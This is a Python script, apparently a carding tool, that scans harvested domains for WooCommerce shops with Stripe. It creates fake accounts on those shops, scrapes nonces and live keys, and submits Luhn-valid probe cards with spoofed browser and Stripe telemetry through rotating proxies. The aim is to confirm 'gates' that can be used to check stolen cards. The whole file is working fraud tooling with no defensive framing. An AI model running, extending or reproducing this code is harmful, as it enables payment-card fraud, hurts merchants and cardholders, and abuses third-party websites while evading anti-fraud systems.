# language: Python 3.12+, file: advanced_gate_scanner.py, target: Windows 11, deps: curl_cffi
import asyncio
import json
import os
import re
import socket
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from curl_cffi.requests import AsyncSession

import gate_client as gc

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")


def resolve_dns(host: str) -> str | None:
    try:
        socket.gethostbyname(host)
        return host
    except Exception:
        return None


async def probe_stage1_fast_surface(domain: str, sem: asyncio.Semaphore, proxy: str | None = None) -> dict | None:
    """Stage 1: Fast GET /my-account/ — check availability, register nonce & pk_live."""
    base = f"https://{domain}"
    url = f"{base}/my-account/"
    async with sem:
        try:
            async with AsyncSession(impersonate="chrome131", verify=False, proxy=proxy) as s:
                r = await s.get(url, timeout=8)
                if r.status_code != 200:
                    return None
                html = r.text
        except Exception:
            return None

    if gc.is_cloudflare_challenge(html):
        return None

    reg_nonce = gc.extract_reg_nonce(html)
    if not reg_nonce:
        return None

    pk_live = gc.extract_pk_live(html) or None
    has_stripe_indicator = (
        pk_live is not None or
        "wc-stripe" in html or
        "stripe.js" in html or
        "wc_stripe" in html or
        "payment_method_stripe" in html
    )

    return {
        "domain": domain,
        "base": base,
        "reg_nonce": reg_nonce,
        "pk_live": pk_live,
        "has_stripe": has_stripe_indicator
    }


async def probe_stage2_3_4_qualification(domain: str, base: str, initial_nonce: str, sem: asyncio.Semaphore, proxy: str | None = None) -> dict | None:
    """Stage 2: Real registration POST -> check wordpress_logged_in.
       Stage 3: Scrape /my-account/add-payment-method/ -> extract pk_live, upe_nonce / legacy_nonce.
       Stage 4: Live SetupIntent confirm probe (Radar Telemetry v2021 + rotating Luhn-valid probe PAN).
    """
    async with sem:
        try:
            async with AsyncSession(impersonate="chrome131", verify=False, proxy=proxy) as s:
                reg_url = f"{base}/my-account/"

                # Fresh page for form inspection & nonce freshness
                r_get = await s.get(reg_url, timeout=8)
                if r_get.status_code != 200:
                    return None
                html = r_get.text

                reg_nonce = gc.extract_reg_nonce(html) or initial_nonce
                ident = gc.random_identity()

                body = {
                    "email": ident["email"],
                    "password": ident["password"],
                    "woocommerce-register-nonce": reg_nonce,
                    "_wp_http_referer": "/my-account/",
                    "register": "Register",
                }
                if 'name="username"' in html:
                    body["username"] = ident["username"]
                gc.extract_honeypot_fields(gc.extract_register_form_html(html), body)

                await s.post(reg_url, data=body,
                             headers={"Origin": base, "Referer": reg_url}, timeout=12)

                cookies = s.cookies.get_dict()
                if not any("wordpress_logged_in" in k for k in cookies):
                    return None

                # === STAGE 3: Authenticated Scrape add-payment-method ===
                add_pm_url = f"{base}/my-account/add-payment-method/"
                r_pm = await s.get(add_pm_url, timeout=10)
                pm_html = r_pm.text

                if "pk_test_" in pm_html and "pk_live_" not in pm_html:
                    return None

                scraped = gc.scrape_gate(pm_html)
                pk, upe_nonce, legacy_nonce = scraped["pk"], scraped["upe_nonce"], scraped["legacy_nonce"]
                if not pk or (not upe_nonce and not legacy_nonce):
                    return None

                # === STAGE 4: Live Mode Probe — v2021 telemetry + m-cookie prefetch ===
                telem = gc.stripe_telemetry(base, pk)
                probe = gc.gen_probe_card()
                tok_body = gc.tokenize_body(probe, telem, base)

                try:
                    await s.get("https://m.stripe.com/6",
                                headers={"Origin": base, "Referer": f"{base}/", "Accept": "*/*"},
                                timeout=5)
                except Exception:
                    pass

                r_tok = await s.post("https://api.stripe.com/v1/payment_methods",
                                     data=tok_body, headers=gc.TOKENIZE_HEADERS, timeout=8)
                tok_data = r_tok.json()
                if "id" not in tok_data:
                    return None

                pm_id = tok_data["id"]

                if upe_nonce:
                    conf_payload = {
                        "action": "wc_stripe_create_and_confirm_setup_intent",
                        "_ajax_nonce": upe_nonce,
                        "wc-stripe-payment-method": pm_id,
                        "wc-stripe-payment-type": "card",
                    }
                    ajax_endpoint = f"{base}/wp-admin/admin-ajax.php"
                else:
                    conf_payload = {"stripe_source_id": pm_id, "nonce": legacy_nonce}
                    ajax_endpoint = f"{base}/?wc-ajax=wc_stripe_create_setup_intent"

                r_conf = await s.post(ajax_endpoint, data=conf_payload,
                                      headers=gc.ajax_headers_for(base, add_pm_url), timeout=12)
                conf_resp = r_conf.json()

                raw_str = json.dumps(conf_resp).lower()
                if "testmode_charges_only" in raw_str or "secret_key_required" in raw_str or "livemode" in raw_str and "false" in raw_str:
                    return None

                is_live_verdict = (
                    conf_resp.get("success") is True or
                    "declined" in raw_str or
                    "incorrect" in raw_str or
                    "requires_action" in raw_str or
                    "succeeded" in raw_str or
                    "card_error" in raw_str
                )

                if is_live_verdict:
                    return {
                        "domain": domain,
                        "base_url": base,
                        "reg_url": reg_url,
                        "add_pm_url": add_pm_url,
                        "ajax_url": ajax_endpoint,
                        "pk_live": pk,
                        "gate_type": "wc_stripe_upe" if upe_nonce else "wc_stripe_legacy",
                        "upe_nonce": upe_nonce,
                        "legacy_nonce": legacy_nonce,
                        "updated_at": int(time.time()),
                        "status": "READY"
                    }
        except Exception:
            return None
    return None


async def main():
    raw_args = sys.argv[1:]
    explicit_proxy = None
    while "--proxy" in raw_args:
        i = raw_args.index("--proxy")
        if i + 1 < len(raw_args):
            explicit_proxy = raw_args[i + 1]
            del raw_args[i:i + 2]
        else:
            del raw_args[i]
    proxy_pool = gc.load_proxies()
    proxy_label = (f"--proxy {explicit_proxy}" if explicit_proxy
                   else (f"{len(proxy_pool)} from data/proxies.txt" if proxy_pool else "direct (no pool)"))

    print("=" * 80)
    print("[*] ADVANCED GATE SCANNER v5 (curl_cffi Chrome TLS + Shared Gate Engine)")
    print(f"[*] Proxy: {proxy_label}")
    print("=" * 80)

    # 1. Load candidate domains — три независимых потока добычи
    domains = []
    candidates = [
        "data/harvested_domains.txt",   # forums harvester lane
        "data/dork_harvested.txt",      # dork harvesters lane
        "data/probe_targets.txt",       # manual targets
        "harvested_domains.txt", "probe_targets.txt",  # legacy cwd fallbacks
    ]
    for fn in candidates:
        if os.path.exists(fn):
            try:
                with open(fn, encoding="utf-8") as f:
                    domains.extend([l.strip() for l in f if l.strip() and not l.startswith("#")])
            except Exception:
                pass

    junk = ['blogspot', '1drv.ms', 'supportally', 'abc.com', 'google', 'wordpress', 'github', 'pastebin', 'gravatar']
    cleaned = []
    for d in domains:
        d = re.sub(r'[^a-z0-9.-]', '', d.strip().lower())
        if d and "." in d and not d.endswith(".") and not any(j in d for j in junk):
            cleaned.append(d)
    raw_domains = sorted(list(set(cleaned)))
    print(f"[*] Loaded {len(raw_domains)} sanitized candidate domains.", flush=True)

    # Load existing verified ready gates to preserve them
    existing_ready = []
    ready_file = os.path.join("data", "ready_gates.json")
    if os.path.exists(ready_file):
        try:
            with open(ready_file, "r", encoding="utf-8") as f:
                data = json.load(f)
                if isinstance(data, list):
                    existing_ready = data
            print(f"[*] Loaded {len(existing_ready)} existing ready gates from pool.")
        except Exception:
            pass

    # 2. DNS resolve
    print("[*] Stage 0: Pre-resolving DNS...", flush=True)
    live_dns_domains = []
    with ThreadPoolExecutor(max_workers=50) as pool:
        results = pool.map(resolve_dns, raw_domains)
        for r in results:
            if r:
                live_dns_domains.append(r)
    print(f"[+] DNS Live: {len(live_dns_domains)} / {len(raw_domains)}", flush=True)

    # 3. Stage 1: Fast Surface Probing
    print(f"\n[*] Stage 1: Fast Surface Probing on {len(live_dns_domains)} domains...", flush=True)
    sem_s1 = asyncio.Semaphore(30)
    s1_tasks = [probe_stage1_fast_surface(d, sem_s1, proxy=gc.pick_proxy(proxy_pool, explicit_proxy))
                for d in live_dns_domains]
    s1_results = await asyncio.gather(*s1_tasks)
    s1_passed = [r for r in s1_results if r]
    print(f"[+] Stage 1 Passed: {len(s1_passed)} clean domains with open registration forms.")

    # 4. Stages 2-4: Deep Qualification
    print(f"\n[*] Stages 2-4: Deep Qualification (Session Reg -> Scrape Nonces -> Confirm Probe)...", flush=True)
    sem_deep = asyncio.Semaphore(15)
    deep_tasks = [
        probe_stage2_3_4_qualification(s["domain"], s["base"], s["reg_nonce"], sem_deep,
                                       proxy=gc.pick_proxy(proxy_pool, explicit_proxy))
        for s in s1_passed
    ]
    deep_results = await asyncio.gather(*deep_tasks)
    new_ready_gates = [r for r in deep_results if r]

    # Merge + TTL prune (Пакет 3): подтверждённые сейчас — READY, fail_count=0;
    # неподтверждённые 24-72ч — метка STALE; старше 72ч — удаление из пула.
    now = int(time.time())
    STALE_AFTER = 24 * 3600
    GATE_TTL = 72 * 3600
    confirmed = {g["domain"]: g for g in new_ready_gates}
    final_ready_gates = []
    for g in existing_ready:
        dom = g.get("domain")
        if dom in confirmed:
            continue  # свежее подтверждение заменит запись
        age = now - int(g.get("updated_at", 0))
        if age > GATE_TTL:
            print(f"  [prune] {dom}: TTL expired ({age // 3600}h unconfirmed) — removed from pool", flush=True)
            continue
        if age > STALE_AFTER and g.get("status") == "READY":
            g["status"] = "STALE"
            print(f"  [stale] {dom}: unconfirmed {age // 3600}h — marked STALE", flush=True)
        final_ready_gates.append(g)
    for dom, g in confirmed.items():
        g["updated_at"] = now
        g["fail_count"] = 0
        g["status"] = "READY"
        final_ready_gates.append(g)

    print("\n" + "=" * 80)
    print(f"[🔥] FINAL QUALIFIED SETUPINTENT GATES IN POOL: {len(final_ready_gates)}")
    print("=" * 80)

    for g in final_ready_gates:
        pk_display = g.get('pk_live', '')[:24] + "..." if g.get('pk_live') else "N/A"
        print(f"  [READY] {g['domain']:32} | Type: {g.get('gate_type', 'unknown'):18} | PK: {pk_display}")

    os.makedirs("data", exist_ok=True)
    with open(ready_file, "w", encoding="utf-8") as f:
        json.dump(final_ready_gates, f, indent=2)

    print(f"\n[+] Saved {len(final_ready_gates)} ready gates to {ready_file}")


if __name__ == "__main__":
    asyncio.run(main())
